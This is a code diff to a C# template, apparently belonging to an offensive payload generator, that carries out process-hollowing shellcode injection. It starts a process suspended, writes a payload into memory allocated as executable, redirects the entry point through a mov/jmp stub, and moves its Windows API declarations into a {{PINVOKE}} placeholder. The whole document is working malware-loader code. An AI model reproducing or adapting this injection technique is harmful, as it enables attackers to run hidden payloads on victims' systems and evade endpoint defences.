@@ -142,7 +142,7 @@ namespace {{NAMESPACE}}
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-            SECURITY_ATTRIBUTES SecAtt = new SECURITY_ATTRIBUTES();
+            SecurityAttributes SecAtt = new SecurityAttributes();
             CreateProcess(null, {{SPAWN}}, ref SecAtt, ref SecAtt, false, 0x00000004 /*CREATE_SUSPENDED*/, IntPtr.Zero, null, ref si, out pi);
 
             int returnLength;
@@ -167,10 +167,10 @@ namespace {{NAMESPACE}}
             uint Reserve = 0x2000;
             IntPtr numBytesWritten;
 
-            IntPtr hPayloadAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length, Commit | Reserve, 0x20 /*RX*/);
-            if (!WriteProcessMemory(pi.hProcess, hPayloadAddr, payload, payload.Length, out numBytesWritten))
+            IntPtr hPayloadAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length, Commit | Reserve, 0x20 /*RX*/);
+            if (!WriteProcessMemory(pi.hProcess, hPayloadAddr, payload, (uint)payload.Length, out numBytesWritten))
             {
-                Console.WriteLine(Marshal.GetLastWin32Error().ToString());
+                Console.WriteLine(""[!] WriteProcessMemory: {0}"",Marshal.GetLastWin32Error().ToString());
                 Process.GetProcessById(pi.dwProcessId).Kill(); //Kill the suspended process.
                 Environment.Exit(1);
             }
@@ -184,9 +184,9 @@ namespace {{NAMESPACE}}
             jmp_rax.CopyTo(full, mov_rax.Length + jmp_address.Length);
 
             IntPtr codeEntry = ((IntPtr)(ntHeader.OptionalHeader.AddressOfEntryPoint + pImageBase.ToInt64()));
-            if (!WriteProcessMemory(pi.hProcess, codeEntry, full, full.Length, out numBytesWritten))
+            if (!WriteProcessMemory(pi.hProcess, codeEntry, full, (uint)full.Length, out numBytesWritten))
             {
-                Console.WriteLine(Marshal.GetLastWin32Error().ToString());
+                Console.WriteLine(""[!] WriteProcessMemory: {0}"",Marshal.GetLastWin32Error().ToString());
                 Process.GetProcessById(pi.dwProcessId).Kill(); //Kill the suspended process.
                 Environment.Exit(1);
             }
@@ -238,7 +238,7 @@ namespace {{NAMESPACE}}
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
+        public struct SecurityAttributes
         {
             public int nLength;
             public IntPtr lpSecurityDescriptor;
@@ -503,23 +503,7 @@ namespace {{NAMESPACE}}
         }
         #endregion PE_StructsAndEnumsForDays
 
-        [DllImport(""kernel32.dll"", SetLastError = true, CharSet = CharSet.Auto)]
-        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport(""ntdll.dll"", SetLastError = true)]
-        static extern int NtQueryInformationProcess(IntPtr hProcess, int ProcessInfoClass, out PROCESS_BASIC_INFORMATION pbi, int cb, out int pSize);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead);
-
-        [DllImport(""kernel32.dll"")]
-        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
+        {{PINVOKE}}
     }
 }";
     }
